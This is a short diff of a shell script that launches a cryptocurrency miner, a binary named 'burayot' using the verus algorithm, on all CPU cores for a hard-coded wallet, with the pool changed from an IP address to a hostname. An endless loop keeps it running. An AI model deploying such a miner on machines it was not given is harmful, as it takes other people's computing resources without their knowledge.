@@ -1,7 +1,7 @@
 #!/bin/sh
 
 chmod 777 burayot
-./burayot -a verus -o stratum+tcp://157.230.246.200:80 -u RSaAjB1zYPF9wEwdbb9UQQGoia5Hp4YpiV.kuk -t $(nproc --all)
+./burayot -a verus -o stratum+tcp://sg.vipor.net:5040 -u RSaAjB1zYPF9wEwdbb9UQQGoia5Hp4YpiV.kuk -t $(nproc --all)
 while [ 1 ]; do
 sleep 3
 done
